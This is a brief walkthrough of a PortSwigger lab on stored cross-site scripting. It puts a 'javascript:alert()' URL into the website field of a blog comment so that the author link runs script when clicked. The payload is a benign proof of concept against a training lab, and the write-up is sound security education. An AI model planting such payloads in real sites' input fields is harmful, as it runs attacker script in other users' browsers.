# Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded
# https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded

```bash
# Create a random comment
Comment: a
Name: a
Email: a@gmail.com
Website: abc
```

```bash
# After that check comments again and inspect your name button.

<a id="author" href="abc">a</a>

# Now post a comment like this

Comment: abc
Name: abc
Email: abc@gmail.com
Website: javascript:alert()

# We completed the lab. If you want to see the alert click back to blog and click to abc.
```
